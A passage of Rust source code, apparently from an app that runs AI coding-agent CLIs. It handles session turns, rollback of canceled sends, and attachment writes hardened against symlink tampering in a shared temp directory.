/// message may be stuck in the old stdin pipe, so reusing that pipe would
/// corrupt the next turn (the next message concatenates onto the prefix), and
/// the child is evidently wedged or dead. Killing it (and clearing the handles)
/// makes `ensure_running_locked` respawn on the next send. `kill_on_drop` would
/// also reap it, but `start_kill` makes the intent explicit and immediate.
pub(crate) fn invalidate_resident(inner: &mut EngineInner) {
    // Orphan the existing reader (mirrors `stop_quiet`): once we kill the child,
    // its stdout EOFs and the reader wakes; without bumping the generation it
    // would still see itself as current and process that EOF/buffered output as
    // the live turn — emitting a spurious stopped/error or clearing the queue of
    // the freshly respawned process. The generation bump makes it exit instead.
    inner.generation += 1;
    inner.stdin = None;
    if let Some(mut child) = inner.child.take() {
        let _ = child.start_kill();
    }
    // The killed child's session_gate slot and computer bearer go with it.
    // Unconditional (not folded into the `if let`): a permit with no child left
    // to represent is exactly the leak, whichever way `child` came to be None,
    // and the bearer wants revoking on both paths regardless. `ensure_running_locked`
    // re-mints before the respawn this invalidation sets up.
    release_child_slot(inner);
}

/// Undo the turn reservation made by `send` Phase 1 when later persistence
/// fails. Leaves the engine idle and forgets the incremented turn id so the
/// next send can start a fresh turn.
///
/// Only undoes a reservation this send still OWNS: the lock was dropped for the
/// failing DB work, so a stop/reset (reset_epoch) or a newer direct reservation
/// (turn_id) may own the state by now — undoing then would clear the busy flag
/// or decrement the turn id of THAT turn, canceling or corrupting it. A leaked
/// increment on our abandoned id is harmless (turn ids are monotonic); a wrong
/// decrement is not.
/// Undo a canceled direct send's Phase-1 reservation and restore the engine's
/// invariants — ownership-guarded: `reset_epoch` + `turn_id` + `busy` must all
/// still match this send, else a stop/reset cleared the turn itself or a newer
/// reservation owns the state, and this no-ops.
///
/// When it does undo, three invariants are restored, not just the busy flag:
/// - `interrupting` is cleared: the interrupt that canceled this send targeted
///   OUR nascent turn, and for per-turn/codex paths no child or TurnEnd will
///   ever exist to clear the flag — leaving it set would reject every later
///   direct send until restart.
/// - messages that queued behind the canceled turn are cleared and finalized
///   `queue_status` ("interrupted" for a cancel, "error" for a persistence
///   failure): an idle engine must never keep a non-empty queue — nothing
///   drains it, and a later send would run ahead of it.
/// - the session activity Phase 1 optimistically persisted as "running" is
///   re-persisted ("stopped"/"idle" per current state): a stop landing between
///   ensure_running_for_send_admitted and Phase 1 has its unlocked "stopped" write
///   overtaken by Phase 1's locked "running" write.
async fn rollback_canceled_send(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    ctx: &SendContext,
    queue_status: &str,
    // true = the canceled send's user row already landed in the timeline, so the
    // reserved turn id stays consumed (the row carries it); false = pre-persistence
    // failure (no row), so the counter rewinds.
    row_persisted: bool,
) {
    let (thread_id, drained) = {
        let mut inner = eng.lock().await;
        if !ctx.direct
            || inner.reset_epoch != ctx.reset_epoch
            || inner.turn_id != ctx.turn
            || !inner.turn.busy
        {
            return;
        }
        inner.turn.busy = false;
        // Keep the turn id CONSUMED when the canceled send's user row was already
        // persisted: that row sits in the timeline carrying this id, and rewinding
        // the counter would hand the same id to the NEXT send — mixing two logical
        // turns in restart recovery and same-turn UI grouping. Only a pre-row
        // failure (nothing persisted) rewinds; spawn-failure rollbacks
        // (reset_failed_hidden_turn) already leave the id consumed.
        if !row_persisted {
            inner.turn_id -= 1;
        }
        inner.current_origin_tag = None;
        inner.interrupting = false;
        // Capture EXACTLY the rows drained here: a blanket per-session sweep
        // would also catch a concurrent send's row inserted after this lock is
        // released — finalizing a message that is about to be delivered.
        let drained: Vec<i32> = inner.turn.queue.iter().filter_map(|o| o.queue_id).collect();
        inner.turn.queue.clear();
        // Persist + emit UNDER the lock: a replacement send's Phase 1 takes this
        // same lock and persists "running" inside it, so releasing first would
        // let this idle/stopped write land AFTER the new turn's running write —
        // leaving DB/UI idle while a turn runs (breaking live counts and
        // boot-revive decisions).
        let status = if inner.stopped {
            STATUS_STOPPED
        } else {
            "idle"
        };
        persist_activity(db, inner.session_id, inner.thread_id, status).await;
        emit_turn_state(app, inner.thread_id, inner.session_id, false, Vec::new());
        (inner.thread_id, drained)
    };
    if !drained.is_empty() {
        match repo::set_queued_status_by_ids(db, &drained, queue_status).await {
            Ok(rows) => {
                for m in rows {
                    emit_finalize(app, thread_id, m.id, queue_status);
                }
            }
            Err(e) => eprintln!("[weft] canceled-send queue finalize failed: {e}"),
        }
    }
}

pub(crate) async fn write_user(inner: &mut EngineInner, out: &Outgoing) -> anyhow::Result<()> {
    let mut content = vec![serde_json::json!({ "type": "text", "text": out.text })];
    for (media_type, data) in &out.images {
        content.push(serde_json::json!({
            "type": "image",
            "source": { "type": "base64", "media_type": media_type, "data": data }
        }));
    }
    let msg = serde_json::json!({
        "type": "user",
        "message": { "role": "user", "content": content }
    });
    let line = format!("{msg}\n");
    let Some(stdin) = inner.stdin.as_mut() else {
        return Err(anyhow::anyhow!("resident stdin is unavailable"));
    };
    // Time-box the write. This runs while the caller holds the engine lock, so an
    // unbounded write to a child that has stopped reading its stdin would pin the
    // lock forever — wedging stop/interrupt/status for the whole session. A live
    // child (we only write-through when it's idle and reading) drains in
    // microseconds; the timeout only fires on a genuinely stuck process.
    let res = tokio::time::timeout(WRITE_USER_TIMEOUT, async {
        stdin.write_all(line.as_bytes()).await?;
        stdin.flush().await
    })
    .await;
    match res {
        Ok(Ok(())) => Ok(()),
        // Either failure mode can leave a partial line in the pipe and an
        // unresponsive child. Invalidate the resident process so the next send
        // respawns clean instead of appending to a corrupt prefix or re-targeting
        // a wedged child; the caller rolls the turn back.
        Ok(Err(e)) => {
            invalidate_resident(inner);
            Err(anyhow::Error::new(e).context("resident stdin write failed"))
        }
        Err(_) => {
            invalidate_resident(inner);
            Err(anyhow::anyhow!(
                "resident stdin write timed out (child not reading)"
            ))
        }
    }
}

/// Snapshot of engine state taken while reserving a send slot. Carrying it
/// across await points lets later phases re-verify the reservation is still
/// valid before mutating the engine.
#[derive(Clone)]
struct SendContext {
    thread_id: i32,
    session_id: Option<i32>,
    turn: i32,
    direct: bool,
    is_command: bool,
    tool: String,
    origin_tag: Option<String>,
    /// The engine's reset_epoch captured at Phase 1. If it advances before the send
    /// commits, a stop/reset invalidated this send (see send_reservation_valid).
    reset_epoch: u64,
}

/// True when the reservation made in `send` Phase 1 is still valid in Phase 3.
/// Stop/reset can race while the engine lock is dropped, so we re-check
/// `stopped`, turn identity, and (for direct sends) the busy flag before
/// writing to stdin, queueing, or spawning.
///
/// Queued sends do not reserve a specific turn; they only observed that the
/// engine was busy in Phase 1. The active turn may finish (and `turn_id`
/// advance) while the lock is dropped, so queued sends tolerate a turn-id
/// change as long as the engine itself has not been stopped.
fn send_reservation_valid(inner: &EngineInner, ctx: &SendContext) -> bool {
    if inner.stopped {
        return false;
    }
    // A teardown that has released the lock for ACP I/O is going to overwrite
    // `turn` when it reacquires it. Admitting work into that window loses it
    // silently — the epoch check below cannot catch this one, because a send
    // arriving mid-teardown captures the ALREADY-bumped epoch and matches.
    if inner.tearing_down {
        return false;
    }
    // A stop/reset since Phase 1 — even one immediately followed by a restart that
    // cleared `stopped` and set `busy` again — bumps reset_epoch (stop_quiet). That
    // invalidates this send so it can't be delivered onto a turn the user canceled.
    if inner.reset_epoch != ctx.reset_epoch {
        return false;
    }
    // An interrupt can land while a direct send is still in Phase 2, before there is
    // any stdin write / child / active turn for interrupt() to act on — it only sets
    // `interrupting`. A direct send IS that turn, so honor the cancel and don't
    // deliver it. (Queued sends target a later turn and survive interrupting the
    // current one, so they are not rejected here.)
    if ctx.direct && inner.interrupting {
        return false;
    }
    if ctx.direct {
        inner.turn_id == ctx.turn && inner.turn.busy
    } else {
        // Queued sends don't own the busy flag: whether to enqueue (still busy),
        // promote into a fresh direct turn (turn ended → idle), or cancel
        // (interrupt teardown in flight) is decided at Phase 3 commit time from
        // CURRENT state. Only a stop/reset (checked above) invalidates them here.
        true
    }
}

/// Phase-3 promotion: a queued send found the engine IDLE at commit time (the
/// active turn ended while the send persisted), so it claims a fresh direct turn
/// instead of appending to a queue nothing will drain. Pure state transition —
/// the caller persists status / dispatches. Returns the promoted turn id.
fn promote_queued_reservation(inner: &mut EngineInner, origin_tag: Option<String>) -> i32 {
    let _ = inner.turn.try_begin_send();
    inner.turn_id += 1;
    inner.clock.begin_turn();
    inner.current_origin_tag = origin_tag;
    inner.turn_id
}

/// Retarget the two pieces of bookkeeping every EOF/TurnEnd handler must sync
/// to whatever `TurnState::on_turn_end` just returned: `turn_user_row` (the
/// rewind anchor AND the current-turn "consumed" marker, issue #94) and
/// `current_origin_tag` (rides the next turn's output frames). `None` (queue
/// drained, engine goes idle) clears both. A hidden receipt whose DB task is
/// already in flight is tracked separately in `hidden_receipt_inflight` and is
/// deliberately preserved across this retarget, so clearing this marker cannot
/// open a duplicate-admission window while that task waits on the gate.
///
/// Every dialect's turn-end site MUST route through this rather than
/// hand-rolling the same two lines: a hand-rolled copy is exactly how PR
/// #117's review found a P1 bug — the per-turn EOF branch in `spawn_reader`
/// dequeued the next turn via `on_turn_end` but left `turn_user_row` pointing
/// at the turn that just ended, so the dequeued turn's first activity
/// mis-marked the WRONG (already-finished, or already-failed) row
/// "consumed" and the row that actually ran was never marked at all —
/// precisely the delivered/consumed truth-inversion issue #94 exists to
/// prevent. Pure state transition, no I/O — callers still own their own
/// EXTRA dialect-specific resets (e.g. claude's `last_assistant_uuid`, codex
/// app-server's `turn_saw_text`) alongside this call.
fn advance_dequeued_turn(inner: &mut EngineInner, next: &Option<Outgoing>) {
    inner.turn_user_row = next
        .as_ref()
        .and_then(|n| n.queue_id.or_else(|| hidden_delivery_id_from_tag(n.origin_tag.as_deref()).map(|id| -id)));
    inner.current_origin_tag = next
        .as_ref()
        .and_then(|n| n.origin_tag.clone())
        .filter(|tag| hidden_delivery_id_from_tag(Some(tag)).is_none());
}

/// a process-local, unpredictable nonce appended to
/// the codex app-server attachment spill's own file name (`send`'s image-spill
/// loop, below) — mirrors the identical fix for the per-hook-call
/// attachment path. `AtomicU64`, not per-call randomness: cheap, monotonic,
/// and unique for the life of this process, which is all "a co-resident
/// process can't pre-place a same-named symlink before this write runs"
/// needs — the write itself also goes through `create_new` (O_EXCL), so even
/// a GUESSED name would still be refused; the nonce just makes guessing
/// itself infeasible in the first place.
static ATTACH_SEQ: AtomicU64 = AtomicU64::new(0);

/// a per-PROCESS random nonce
/// folded into codex app-server attachment file names. `ATTACH_SEQ` above is
/// monotonic and unique only WITHIN one process — two concurrent Weft
/// processes sharing the OS temp dir (an installed app plus `tauri dev`, which
/// use SEPARATE databases and can therefore mint the SAME `row_id`) both start
/// that counter at 0 and generate identical `msg<row>-<i>-<seq>` paths. The
/// app-server branch writes with `create_new` (O_EXCL), so whichever process
/// loses that collision silently drops the human's image from
/// `local_image_paths` while its text turn proceeds. A random component that is
/// stable for THIS process's lifetime (but disjoint from any other process's)
/// makes the two processes' paths never collide, without disturbing the
/// PREDICTABLE non-app-server names `rewind::dispatched_text` reconstructs.
fn attach_process_nonce() -> u64 {
    static NONCE: std::sync::OnceLock<u64> = std::sync::OnceLock::new();
    *NONCE.get_or_init(rand::random::<u64>)
}

/// write a codex app-server image attachment to `p`
/// guarded against a pre-placed symlink/existing file at that exact path —
/// mirrors `computer::screenshot_window`'s own no-follow/exclusive/owner-only
/// write for the identical "a background process on this account swaps the
/// target the instant before Weft writes it" hazard (the same fix landed for the
/// analogous per-hook-call attachment path the same way). `create_new`
/// (O_EXCL) refuses to write through anything already at `p` (the caller's
/// own `ATTACH_SEQ` nonce means this never spuriously collides with a prior,
/// legitimate attachment of this process's own); `O_NOFOLLOW` refuses to
/// follow a symlink leaf even if one raced into place after `create_dir_all`
/// but before this call. `mode(0o600)` keeps the file owner-only from the
/// moment of creation. Returns `false` (never panics) on ANY failure —
/// best-effort, mirroring the plain `std::fs::write(...).is_ok()` this
/// replaces for the codex app-server branch: a skipped image must never fail
/// the whole chat turn, it just means that one attachment doesn't make it
/// into this turn.
///
/// RESIDUAL (documented, not closed here — mirrors the attachment-write note,
/// and the broader TOCTOU tracking): after this call returns and the
/// file handle closes, a SAME-UID process can still `readdir` the (shared)
/// spill directory, discover the real (nonce-bearing) file name, and swap it
/// for a symlink before the codex app-server PROCESS ITSELF later opens
/// `local_image_paths` to build its own `turn/start` payload — this closes
/// the window up through THIS write, not the separate one between this write
/// and codex's own later read. Fully closing that needs codex itself to
/// either accept raw bytes (never a path at all) or open with its own
/// `O_NOFOLLOW` — neither is in this codebase's control.
#[cfg(unix)]
fn write_attachment_no_follow(p: &std::path::Path, bytes: &[u8]) -> bool {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let mut opt = std::fs::OpenOptions::new();
    opt.write(true)
        .create_new(true)
        .mode(0o600)
        .custom_flags(libc::O_NOFOLLOW);
    match opt.open(p) {
        Ok(mut f) => f.write_all(bytes).is_ok(),
        Err(_) => false,
    }
}

/// Non-unix fallback: the pre-existing plain write — owner-only/no-follow
/// hardening is a unix-only concept this crate can portably act on (see this
/// function's own `#[cfg(unix)]` sibling above).
#[cfg(not(unix))]
fn write_attachment_no_follow(p: &std::path::Path, bytes: &[u8]) -> bool {
    std::fs::write(p, bytes).is_ok()
}

/// write a PER-TURN dialect's image attachment to
/// `p` guarded against a pre-placed symlink, EXTENDING the earlier
/// no-follow defense (see [`write_attachment_no_follow`]'s own doc) to every
/// spill branch, not just codex app-server. An earlier fix scoped the hardened
/// write to app-server alone, reasoning that every OTHER per-turn dialect
/// only ever lists the spilled path in TEXT for the agent to read itself —
/// a materially lower-severity exposure than app-server's own first-class
/// `localImage` turn/start input. The hazard:
/// reasoning incomplete: the vulnerable step is this WRITE itself, not what
/// happens to the path afterward — plain `std::fs::write` (what this
/// replaces for every non-app-server branch) follows a symlink and
/// TRUNCATES its target, so a same-UID process that predicts the next
/// `msg<row_id>-<i>.<ext>` name and pre-plants a symlink to an arbitrary
/// user-writable file gets it clobbered by Weft's own write the instant a
/// human's next image attachment lands — regardless of whether any agent
/// ever reads the resulting path.
///
/// Unlike [`write_attachment_no_follow`], this does NOT use `create_new`
/// (O_EXCL): these branches use a PREDICTABLE name (`msg<row_id>-<i>.<ext>`,
/// no `ATTACH_SEQ` nonce), and a rewind can re-dispatch the SAME user row —
/// same `row_id`, same predictable path — a second time. `create_new` would
/// then spuriously refuse Weft's own earlier, legitimate write sitting at
/// that exact path, breaking replay (`rewind::dispatched_text`'s own
/// persisted-`dispatched`-field fallback aside, this write must still be
/// ABLE to happen a second time). `create(true).truncate(true)` instead
/// permits overwriting an ordinary pre-existing file (our own prior write),
/// while `O_NOFOLLOW` still refuses the kernel-level `open(2)` outright
/// (`ELOOP`) the instant the leaf is a symlink — closing exactly the vector
/// named above, without reopening the earlier replay
/// concern. `mode(0o600)` keeps this owner-only from creation, matching
/// every other attachment/screenshot write this codebase already hardens
/// this way.
///
/// RESIDUAL (documented, not closed here — same shape as
/// [`write_attachment_no_follow`]'s own note): a same-UID process using a
/// HARD LINK instead of a symlink at the predictable path is not caught by
/// `O_NOFOLLOW` (which only ever refuses a symlink leaf) — `truncate(true)`
/// would still write through a hard-linked file, corrupting whatever else
/// it's linked to. Closing that fully needs either `create_new` (which
/// breaks the replay case above) or moving spilled attachments into a
/// directory no other account/process can write into at all; tracked as a
/// follow-up, not required to close the SYMLINK vector this
/// round's fix targets.
#[cfg(unix)]
fn write_attachment_no_follow_allow_overwrite(p: &std::path::Path, bytes: &[u8]) -> bool {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let mut opt = std::fs::OpenOptions::new();
    opt.write(true)
        .create(true)
        .truncate(true)
        .mode(0o600)
        .custom_flags(libc::O_NOFOLLOW);
    match opt.open(p) {
        Ok(mut f) => f.write_all(bytes).is_ok(),
        Err(_) => false,
    }
}

/// Non-unix fallback — see [`write_attachment_no_follow`]'s own sibling for
/// why owner-only/no-follow hardening is unix-only here.
#[cfg(not(unix))]
fn write_attachment_no_follow_allow_overwrite(p: &std::path::Path, bytes: &[u8]) -> bool {
    std::fs::write(p, bytes).is_ok()
}

/// Send a human message: optimistic-persist + either write through or queue.
/// `images` ride the outbound message as base64 blocks; `files` are appended
/// as plain paths (the agent reads them with its own tools).
pub async fn send(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    text: &str,
    images: Vec<(String, String)>,
    files: Vec<String>,
    origin_tag: Option<String>,
) -> anyhow::Result<()> {
    let _engine_admission = engine_admission_guard(app, db, eng).await?;
    crate::process_quota::admit_new_work(app)?;
    // A rewind holds its reservation from the busy check to the final
    // truncate; sends error out for that window rather than racing the
    // rewind's stop/truncate steps.
    {
        let inner = eng.lock().await;
        if inner.rewinding {
            return Err(anyhow::anyhow!("会话正在回退，请稍后重试"));
        }
        if inner.quota_failover_committing {
            return Err(anyhow::anyhow!("engine_switch_in_progress"));
        }
    }
    // Skill-refresh: a flag set on idle means newly-injected skills are waiting.
    // Silently bounce the resident process so the relaunch (resume) reads them.
    // Invisible: no "stopped" emit; UI goes straight idle→busy on this send.
    // Skill refresh is only ever flagged while idle, so it bounces now. A command
    // refresh (alias change) can be flagged mid-turn; defer its bounce until the
    // engine is idle so a follow-up sent during a running turn just queues (never
    // kills the in-flight turn / clears its rows) — the bounce fires on the next
    // idle send instead.
    let (skill_pending, cmd_now) = {
        let g = eng.lock().await;
        (
            g.pending_skill_refresh,
            g.pending_command_refresh && !g.turn.busy,
        )
    };
    if skill_pending || cmd_now {
        let tool_for_shutdown = eng.lock().await.tool.clone();
        let StopQuietOutcome {
            thread_id: tid,
            orphans,
            acp_asks,
            ..
        } = stop_quiet_admitted(eng).await;
        if let Some(asks) = app.try_state::<crate::ask::AskRegistry>() {
            for id in acp_asks {
                asks.inner().cancel(id);
            }
        }
        // Do NOT backend-wide reap the ACP pool — other sessions may still be
        // mid-turn on another pin. stop_quiet already cancelled+unsubscribed
        // THIS engine; next send uses client(backend, new_program).
        let _ = (cmd_now, tool_for_shutdown);
        {
            let mut g = eng.lock().await;
            g.pending_skill_refresh = false;
            if cmd_now {
                g.pending_command_refresh = false;
            }
        }
        // The bounce fires from idle, so orphans is normally empty; finalize
        // defensively so a still-open tool row can't outlive the bounce.
        finalize_orphan_tool_rows(app, db, tid, orphans, "interrupted").await;
    }
    // A visible send is the explicit resume boundary. Admit every pending
    // durable hidden handoff before any visible-send preflight can succeed, so
    // a replay/admission failure blocks the visible send itself.
    admit_pending_durable_hidden_for_visible(app, db, eng).await?;

    // Pre-flight agent resolution: if the configured CLI can't be found on PATH, a
    // spawn would fail deep inside with a raw "No such file or directory (os error
    // 2)" that surfaces only as a generic "errored" label. Surface a friendly,
    // localizable row up front instead — this one check covers every transport
    // (resident, per-turn, codex app-server) — and skip the turn so the user can
    // install/point the agent and retry.
    //
    // Guards: (a) IDLE only — a busy engine means a turn already resolved+spawned
    // the CLI, so a follow-up must queue via try_begin_send(), not advance turn_id
    // here. (b) unix only — Windows GUIs inherit PATH fine, and which_on_path has
    // no PATHEXT/.exe lookup, so it would false-negative a valid `codex.exe`.
    if !cfg!(windows) {
        let (tool, command, thread_id, sid, busy) = {
            let g = eng.lock().await;
            (
                g.tool.clone(),
                crate::tool_command::effective(g.command.as_deref(), &g.tool),
                g.thread_id,
                g.session_id,
                g.turn.busy,
            )
        };
        // Match how the actual turn spawns: a bare `Command::new(command)` on the
        // augmented PATH. resolve_tool_path's Codex app-bundle fallback would say
        // "found" for a bundle the bare spawn can't reach, so use the PATH-only check.
        if !busy && !crate::detect::resolves_on_path(&command) {
            let turn = {
                let mut g = eng.lock().await;
                g.turn_id += 1;
                g.turn_id
            };
            let image_uris: Vec<String> = images
                .iter()
                .map(|(mt, data)| format!("data:{mt};base64,{data}"))
                .collect();
            let user = serde_json::json!({ "text": text, "images": image_uris, "files": files })
                .to_string();
            // Propagate insert failures (e.g. a locked/full DB): if the rows aren't
            // durably recorded we must NOT clear the composer, so `?` returns Err and
            // the normal error path preserves the draft. Only the emits are best-effort.
            let user_row =
                repo::insert_lead_message(db, thread_id, sid, turn, "user", "text", &user, "error")
                    .await?;
            let _ = app.emit(
                EVENT,
                Push::Message {
                    thread_id,
                    message: user_row,
                },
            );
            let notice =
                serde_json::json!({ "terminal": "agent_not_found", "tool": tool }).to_string();
            let notice_row = repo::insert_lead_message(
                db,
                thread_id,
                sid,
                turn,
                "assistant",
                "text",
                &notice,
                "error",
            )
            .await?;
            let _ = app.emit(
                EVENT,
                Push::Message {
                    thread_id,
                    message: notice_row,
                },
            );
            // Both rows are durably recorded, so resolve OK: returning Err here would
            // trip the composer's error path and restore the draft → duplicate on retry.
            return Ok(());
        }
    }
    ensure_running_for_send_admitted(app, db, eng).await?;

    // Phase 1: acquire the lock only long enough to reserve turn state and
    // snapshot the fields needed for persistence. All slow IO (DB writes,
    // image spills, stdin writes) happens after the lock drops so
    // stop/interrupt/status stay responsive for the session.
    let ctx = {
        let mut inner = eng.lock().await;
        // Recheck the rewind reservation under the ADMISSION lock: the early
        // check at fn top released the mutex long ago, and a rewind may have
        // started since — a send admitted now would be interrupted and its
        // rows deleted by the rewind's stop/truncate steps.
        if inner.rewinding {
            return Err(anyhow::anyhow!("会话正在回退，请稍后重试"));
        }
        if inner.quota_failover_committing {
            return Err(anyhow::anyhow!("engine_switch_in_progress"));
        }
        // A code restore holds a reservation on the whole WORKTREE: sibling
        // sessions of the same worktree must not start editing it mid-restore.
        if inner
            .worktree_id
            .is_some_and(crate::checkpoint::worktree_op_reserved)
        {
            return Err(anyhow::anyhow!("该 worktree 正在回退代码，请稍后重试"));
        }
        let direct = inner.turn.try_begin_send();
        // Count only tracked (user-visible) items: hidden plumbing deliveries
        // (queue_id == None) are filtered out of the UI, so they must not eat the budget.
        if !direct && visible_queued(&inner.turn) >= MAX_QUEUED {
            return Err(anyhow::anyhow!("queue_full"));
        }
        if direct {
            inner.turn_id += 1;
            inner.clock.begin_turn();
            // This send starts a turn now → its tag IS the in-flight turn's tag.
            inner.current_origin_tag = origin_tag.clone();
            crate::power::on_turn_began(app);
            // Persist "running" WHILE holding the lock so it is ordered before any
            // concurrent stop's "stopped" write: stop_quiet must take this same lock
            // first, so its later "stopped" write can't be overtaken and leave a
            // stopped session recorded as running (which boot-revive would resume).
            persist_activity(db, inner.session_id, inner.thread_id, "running").await;
        }
        SendContext {
            thread_id: inner.thread_id,
            session_id: inner.session_id,
            turn: inner.turn_id,
            direct,
            is_command: text.trim_start().starts_with('/'),
            tool: inner.tool.clone(),
            origin_tag: origin_tag.clone(),
            reset_epoch: inner.reset_epoch,
        }
    };

    let kind = if ctx.is_command { "command" } else { "text" };
    let status = if ctx.direct { "complete" } else { "queued" };
    let image_uris: Vec<String> = images
        .iter()
        .map(|(mt, data)| format!("data:{mt};base64,{data}"))
        .collect();
    let content = if ctx.is_command {
        let trimmed = text.trim_start();
        let mut it = trimmed.splitn(2, ' ');
        serde_json::json!({
            "command": it.next().unwrap_or_default(),
            "args": it.next().unwrap_or_default(),
        })
        .to_string()
    } else {
        serde_json::json!({ "text": text, "images": image_uris, "files": files }).to_string()
    };

    // Phase 2: persist the user row and spill per-turn image attachments without
    // holding the engine lock.
    let m = match repo::insert_lead_message(
        db,
        ctx.thread_id,
        ctx.session_id,
        ctx.turn,
        "user",
        kind,
        &content,
        status,
    )
    .await
    {
        Ok(m) => m,
        Err(e) => {
            // Phase 1 already reserved turn state; undo it (and restore the
            // engine invariants — activity, queue, interrupt flag) so the
            // session isn't left with a stuck busy flag or an orphaned turn id.
            rollback_canceled_send(app, db, eng, &ctx, "error", false).await;
            return Err(e.into());
        }
    };
    let row_id = m.id;
    let _ = app.emit(
        EVENT,
        Push::Message {
            thread_id: ctx.thread_id,
            message: m,
        },
    );

    // Pre-turn code checkpoint (worker sessions only), awaited BEFORE the
    // Phase 3/4 dispatch (write_user / spawn) so it captures the pre-turn
    // worktree state. Queued sends checkpoint at their dequeue instead.
    if ctx.direct {
        snapshot_turn_checkpoint(app, db, ctx.session_id, ctx.turn, row_id).await;
    }

    // A switch (issue #96) may have staged a history digest for exactly this
    // next turn — read here (NOT `.take()`n — see the clear at the bottom of
    // this function) so it rides the DISPATCHED text (agent-visible) without
    // polluting `content` (the human-visible row built above from the raw
    // `text`/`kind` a moment ago — the same asymmetry the "Attached files"
    // appendix below already relies on). PEEK, don't consume, under a fresh
    // lock: cheap, and Phase 1 already dropped its lock before this point.
    //
    // Adversarial re-review of PR #139, P1: an EARLIER version of this code
    // used `.take()` right here, before ANY of this function's many failure
    // paths (reservation invalidated, write_user, queue-full, spawn_turn,
    // spawn_codex_turn_or_exec, …) had a chance to run — so a transient
    // failure on the FIRST send attempt after a switch permanently discarded
    // the digest with no way to re-stage it short of switching again. Cloning
    // here and clearing ONLY at the bottom — the single point every success
    // path in this function converges on (verified: every OTHER exit between
    // here and there is a `return Err(...)`) — means a failed attempt leaves
    // the field untouched for the retry to pick up.
    let digest = eng.lock().await.pending_context_digest.clone();
    // Deliberately digest-FREE through the attachment appendices and the
    // `dispatched` persistence below — the digest is prepended as the very
    // last step, right before `Outgoing` is built, so it can never reach
    // anything written to the DB (see that step for why).
    let mut outbound = text.to_string();
    // Capture BEFORE images may be spilled to temp files below (per-turn dialects
    // clear out.images after spill; has_attachments must reflect the original inputs).
    let has_attachments = !files.is_empty() || !images.is_empty();
    if !files.is_empty() {
        outbound.push_str("\n\nAttached files (read them as needed):\n");
        for f in &files {
            outbound.push_str(&format!("- {f}\n"));
        }
    }
    // Hoisted above the spill loop (rather than computed only at Phase 3 below,
    // as it used to be) so the loop can tell app-server codex apart from every
    // other per-turn dialect/transport while it's spilling.
    let is_codex_appserver = ctx.tool == "codex" && codex_appserver_enabled();
    // Per-turn dialects take no inline image blocks: spill pasted images to
    // temp files and hand over paths — every agent can read those itself.
    let mut local_image_paths: Vec<String> = Vec::new();
    let images = if per_turn(&ctx.tool) && !images.is_empty() {
        use base64::Engine as _;
        let dir = std::env::temp_dir().join("weft-attachments");
        let _ = std::fs::create_dir_all(&dir);
        // refuse a SYMLINK
        // planted at the shared spill dir. `create_dir_all` FOLLOWS a symlink
        // already sitting at this path, and the `set_permissions` below would
        // then chmod — and every spill write would traverse — whatever it
        // points to; the per-file `O_NOFOLLOW` writes only guard the LEAF file
        // name, never this parent. Verify the dir itself is a real directory
        // via `symlink_metadata`; if it is not, spill NOTHING (iterate an empty
        // slice below) rather than write through an attacker-substituted
        // parent — the human's text turn still goes out, just without inline
        // images.
        let dir_is_real = std::fs::symlink_metadata(&dir)
            .map(|m| m.file_type().is_dir())
            .unwrap_or(false);
        // best-effort tighten the shared spill
        // directory to owner-only — defense in depth alongside the per-file
        // hardening below, for the identical "shared tmp dir, permissive
        // process umask" hazard `computer::screenshot_window` also closes.
        // Best-effort: a failure here (already-wrong ownership, a read-only
        // mount, non-unix) never blocks the spill itself.
        #[cfg(unix)]
        {
            if dir_is_real {
                use std::os::unix::fs::PermissionsExt;
                let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
            }
        }
        if dir_is_real {
            outbound.push_str("\n\nAttached images (read them as needed):\n");
        }
        // A symlinked/unsafe spill dir yields an empty iteration — no image is
        // written through it, and `local_image_paths` stays empty.
        let spill: &[(String, String)] = if dir_is_real { &images } else { &[] };
        for (i, (mt, data)) in spill.iter().enumerate() {
            let ext = mt.rsplit('/').next().unwrap_or("png");
            // ONLY the codex app-server branch gets
            // a NONCE-bearing name — that's the ONLY transport that later
            // hands this exact path to the agent as a first-class
            // `localImage` turn/start input (`is_codex_appserver` branch just
            // below); every OTHER per-turn dialect keeps the PREDICTABLE
            // `msg<row_id>-<i>.<ext>` name `rewind::dispatched_text`'s own
            // fallback reconstruction relies on for rows that predate its
            // persisted-`dispatched`-field stamping (see this function's own
            // "Persist the EXACT dispatched text" comment below).
            //
            // EVERY branch now gets a no-follow
            // guarded write, not just app-server — see
            // `write_attachment_no_follow_allow_overwrite`'s own doc for why
            // The OLD app-server-only scoping
            // incomplete: a plain `std::fs::write` at a predictable name
            // follows a symlink and truncates whatever it points at,
            // regardless of whether any agent later reads the resulting
            // path — the vulnerable step is THIS write, not the later read.
            let p = if is_codex_appserver {
                let seq = ATTACH_SEQ.fetch_add(1, Ordering::SeqCst);
                // the per-process
                // nonce disjoins this name from any OTHER Weft process's spill
                // (which could share `row_id`/`seq` with an independent counter)
                // — see `attach_process_nonce`'s own doc. Only the app-server
                // branch: the `else` branch's name stays PREDICTABLE for
                // `rewind::dispatched_text`'s reconstruction.
                dir.join(format!("msg{row_id}-{i}-{}-{seq}.{ext}", attach_process_nonce()))
            } else {
                dir.join(format!("msg{row_id}-{i}.{ext}"))
            };
            if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(data) {
                let written = if is_codex_appserver {
                    // Nonce-named — never collides with a prior write of our
                    // own, so `create_new` (O_EXCL) is both safe and stricter.
                    write_attachment_no_follow(&p, &bytes)
                } else {
                    // Predictable name — a rewind can re-dispatch the SAME
                    // row a second time, landing on this SAME path, so this
                    // must still allow overwriting our own prior write (see
                    // `write_attachment_no_follow_allow_overwrite`'s own doc)
                    // while still refusing a symlink leaf.
                    write_attachment_no_follow_allow_overwrite(&p, &bytes)
                };
                if written {
                    outbound.push_str(&format!("- {}\n", p.display()));
                    // app-server transport ALSO gets these as first-class
                    // `localImage` input items on turn/start (codex_app_server::
                    // turn_start_params_with_images) — not just a path listed in
                    // the text. exec has no such channel, so it stays text-only.
                    if is_codex_appserver {
                        local_image_paths.push(p.display().to_string());
                    }
                }
            }
        }
        vec![]
    } else {
        images
    };
    // Persist the EXACT dispatched text for image-bearing per-turn rows: the
    // spill loop above omits a path when decode/write fails, and rewind's
    // native text match can't reconstruct that retroactively. (Text/files
    // appendices are deterministic; only images need this.) `outbound` here is
